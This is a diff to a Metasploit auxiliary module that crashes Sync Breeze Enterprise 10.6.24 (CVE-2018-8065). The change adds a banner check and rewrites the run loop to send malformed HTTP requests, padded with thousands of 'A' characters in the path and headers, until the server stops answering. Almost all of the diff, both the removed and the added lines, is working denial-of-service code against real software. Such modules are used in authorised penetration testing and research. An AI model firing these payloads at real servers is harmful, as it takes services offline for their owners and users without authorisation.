@@ -4,8 +4,8 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Dos
+  include Msf::Exploit::Remote::Tcp
 
   def initialize(info = {})
     super(update_info(info,
@@ -19,7 +19,7 @@ class MetasploitModule < Msf::Auxiliary
       'License'        => MSF_LICENSE,
       'References'     =>
         [
-          ['CVE', '2018-8065'],
+          [ 'CVE', '2018-8065'],
           [ 'URL', 'https://github.com/EgeBalci/Sync_Breeze_Enterprise_10_6_24_-DOS' ],
         ],
       'DisclosureDate' => 'Mar 09 2018'))
@@ -31,55 +31,45 @@ class MetasploitModule < Msf::Auxiliary
 
   end
 
-  def run
-    print_status("Sending HTTP DoS packets...")
-    trig = true
-
+  def check
     begin
       connect
-      disconnect
+      sock.put("GET / HTTP/1.0\r\n\r\n")
+      res = sock.get
+      if res and res.include? 'Flexense HTTP Server v10.6.24'
+        Exploit::CheckCode::Vulnerable
+      else
+        Exploit::CheckCode::Safe
+      end
     rescue
-      print_error("Unable to connect to #{rhost}:#{rport}")
-       trig = false
+      Exploit::CheckCode::Safe
+    end
+  end
+
+  def run
+    unless check == Exploit::CheckCode::Vulnerable
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
     end
 
-    while trig do
-        payload = ""
-        rnd = rand(4)
-        if rnd == 0 then
-            payload << "PUT /index.html HTTP/1.1\n"
-            payload << "Host: localhost\n"
-            payload << "User-Agent: Mozilla\n"
-            payload << "Accept: */*"+("A"*rand(8000))+"\r\n\r\n"
-        elsif rnd == 1 then
-            payload << "POST /"+("A"*rand(8000))+" HTTP/0.9\n"
-            payload << "Host: localhost\n"
-            payload << "User-Agent: Mozilla\n"
-            payload << "Accept: */*\r\n\r\n"
-        elsif rnd == 2 then
-            payload << "POST /index.html HTTP/0.9\n"
-            payload << "Host: localhost\n"
-            payload << "User-Agent: Mozilla"+("A"*rand(8000))+"\n"
-            payload << "Accept: */*\r\n\r\n"
-        elsif rnd == 3 then
-            payload << "GET /index.html HTTP/0.9\n"
-            payload << "Host: localhost\n"
-            payload << "User-Agent: Mozilla\n"
-            payload << "Accept: */*"+("A"*rand(8000))+"\r\n\r\n"
-        end
-
-        print_status("Request size: (#{payload.size}) byte")
-        begin
-            connect
-            sock.put(payload)
-            disconnect
-        rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-            print_error("Unable to connect to #{rhost}:#{rport}")
-            break
-        rescue ::Errno::ECONNRESET,::Rex::ConnectionRefused
-            print_good("DoS successful #{rhost} is down !")
-            break
-        end
+    print_status('Triggering the vulnerability')
+    loop do
+      payload = ""
+      payload << "GET /"+('A'*rand(8000))+" HTTP/0.9\n"
+      payload << "Host: 127.0.0.1\n"
+      payload << "User-Agent: Mozilla"+('A'*rand(8000))+"\n"
+      payload << "Accept: "+('A'*rand(8000))+"\r\n\r\n"
+      begin
+        connect
+        sock.put(payload)
+        disconnect
+      rescue ::Rex::ConnectionTimeout
+        print_error('Connection timeout !')
+      rescue ::Errno::ECONNRESET
+        print_error('Connection reset !')
+      rescue ::Rex::ConnectionRefused
+        print_good("DoS successful #{rhost} is down !")
+        break
+      end
     end
   end
 end
